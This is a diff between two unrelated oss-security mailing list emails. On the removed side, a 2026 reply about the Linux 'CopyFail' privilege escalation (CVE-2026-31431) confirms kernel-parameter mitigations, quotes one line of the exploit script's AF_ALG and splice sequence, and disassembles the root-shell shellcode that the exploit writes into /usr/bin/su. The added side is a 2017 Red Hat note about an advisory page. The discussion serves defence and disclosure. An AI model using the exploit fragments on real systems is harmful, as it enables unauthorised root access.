@@ -1,4 +1,9 @@
-Received: (qmail 30603 invoked by uid 550); 30 Apr 2026 01:52:53 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["613" "Monday" "7" "August" "2017" "09:52:49" "-0400" "Vladis Dronov" "vdronov@redhat.com" "<613154429.39760878.1502113969550.JavaMail.zimbra@redhat.com>" "14" "Re: [oss-security] [CVE-2017-7533] kernel: inotify: a race between inotify_handle_event() and sys_rename()" nil nil nil "8" "2017080713:52:49" "[oss-security] [CVE-2017-7533] kernel: inotify: a race between inotify_handle_event() and sys_rename()" (number mark "U       vdronov@redh Aug  7   14/613   " thread-indent "\"Re: [oss-security] [CVE-2017-7533] kernel: inotify: a race between inotify_handle_event() and sys_rename()\"\n") "<d0a17b55-f653-4b64-1459-cab178ff0a56@oracle.com>" ("<754818373.38559522.1501768802232.JavaMail.zimbra@redhat.com>" "<d0a17b55-f653-4b64-1459-cab178ff0a56@oracle.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 17886 invoked by uid 550); 7 Aug 2017 13:53:02 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,86 +12,38 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 29853 invoked from network); 30 Apr 2026 01:52:46 -0000
-Date: Thu, 30 Apr 2026 03:52:33 +0200
-From: Solar Designer <solar@openwall.com>
+Received: (qmail 17769 invoked from network); 7 Aug 2017 13:53:01 -0000
+DMARC-Filter: OpenDMARC Filter v1.3.2 mx1.redhat.com A36205D697
+Authentication-Results: ext-mx10.extmail.prod.ext.phx2.redhat.com; dmarc=none (p=none dis=none) header.from=redhat.com
+Authentication-Results: ext-mx10.extmail.prod.ext.phx2.redhat.com; spf=fail smtp.mailfrom=vdronov@redhat.com
+Date: Mon, 7 Aug 2017 09:52:49 -0400 (EDT)
+From: Vladis Dronov <vdronov@redhat.com>
 To: oss-security@lists.openwall.com
-Message-ID: <20260430015233.GA24812@openwall.com>
-References: <afJorKIje4O6dXbH@netmeister.org> <871pfxpf0v.fsf@gentoo.org> <afKs-tphZDvl3GIX@panix.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-In-Reply-To: <afKs-tphZDvl3GIX@panix.com>
-User-Agent: Mutt/1.4.2.3i
-Subject: Re: [oss-security] CVE-2026-31431: CopyFail: linux local privilege scalation
+Message-ID: <613154429.39760878.1502113969550.JavaMail.zimbra@redhat.com>
+In-Reply-To: <d0a17b55-f653-4b64-1459-cab178ff0a56@oracle.com>
+References: <754818373.38559522.1501768802232.JavaMail.zimbra@redhat.com> <d0a17b55-f653-4b64-1459-cab178ff0a56@oracle.com>
+MIME-Version: 1.0
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: 7bit
+X-Originating-IP: [10.40.4.119, 10.4.195.12]
+Thread-Topic: kernel: inotify: a race between inotify_handle_event() and sys_rename()
+Thread-Index: tqnb4eiY64pFDmxIvR21NuXkBZanjw==
+X-Scanned-By: MIMEDefang 2.79 on 10.5.11.14
+X-Greylist: Sender IP whitelisted, not delayed by milter-greylist-4.5.16 (mx1.redhat.com [10.5.110.39]); Mon, 07 Aug 2017 13:52:49 +0000 (UTC)
+Subject: Re: [oss-security] [CVE-2017-7533] kernel: inotify: a race between
+ inotify_handle_event() and sys_rename()
 
-On Wed, Apr 29, 2026 at 09:14:34PM -0400, Zube wrote:
-> > > # echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
-> > > # rmmod algif_aead 
-> > 
-> > Brad Spengler has been pointing out that this won't work on a few common
-> > enterprise kernels where CONFIG_CRYPTO_USER_API_AEAD=y (rather than m).
-> 
-> An initial test of adding:
-> 
-> initcall_blacklist=algif_aead_init
-> 
-> to the kernel command line and rebooting seems to block the exploit.
+Hello, John,
 
-Yes, and this was also shared on Mattermost channels of Rocky Linux by
-user Curious:
+> > https://access.redhat.com/security/vulnerabilities/3112931
+>
+> I suspect there's nothing in this that's not repeated elsewhere, but
+> that page says "Access Denied".
 
-> Looks like:
-> grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"
-> 
-> and reboot does the job.
-> 
-> After you run your grubby command and reboot, you should verify that the argument was applied and the feature is inactive.
-> 
-> Check boot arguments:
-> cat /proc/cmdline
->     (Look for initcall_blacklist=algif_aead_init in the string).
+Indeed, this article is not published yet and we are (I am) working on it, it should be ready soon.
+I've included the link to the article in the announce for the reference of future readers. You are
+correct, the article mostly duplicates the announce and the only additional information is related
+to the Red Hat's products, like advisories with the fix.
 
-I confirm the above worked for me on Rocky Linux 9.7.  The exploit
-copy_fail_exp.py worked before the above change, but fails as follows
-after the change:
-
-$ python3.11 copy_fail_exp.py
-Traceback (most recent call last):
-  File "/home/user/CVE-2026-31431/copy_fail_exp.py", line 9, in <module>
-    while i<len(e):c(f,i,e[i:i+4]);i+=4
-                   ^^^^^^^^^^^^^^^
-  File "/home/user/CVE-2026-31431/copy_fail_exp.py", line 5, in c
-    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
-                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-FileNotFoundError: [Errno 2] No such file or directory
-
-Another curious detail is the exploit needs Python newer than EL9
-installs by default, which might slow down some script kiddies a little
-bit.  The above Python 3.11 worked (before the mitigation), but Rocky
-Linux 9.7's default install of 3.9 did not (has no os.splice).
-
-Here's what the exploit puts in /usr/bin/su when successful:
-
-0x0000000000400078:  xor    %eax,%eax
-0x000000000040007a:  xor    %edi,%edi
-0x000000000040007c:  mov    $0x69,%al
-0x000000000040007e:  syscall
-0x0000000000400080:  lea    0xf(%rip),%rdi        # 0x400096
-0x0000000000400087:  xor    %esi,%esi
-0x0000000000400089:  push   $0x3b
-0x000000000040008b:  pop    %rax
-0x000000000040008c:  cltd
-0x000000000040008d:  syscall
-0x000000000040008f:  xor    %edi,%edi
-0x0000000000400091:  push   $0x3c
-0x0000000000400093:  pop    %rax
-0x0000000000400094:  syscall
-
-The syscalls are setuid(), execve(), exit().
-
-(gdb) print (char *)0x400096
-$1 = 0x400096 "/bin/sh"
-
-Alexander
+Best regards,
+Vladis Dronov | Red Hat, Inc. | Product Security Engineer
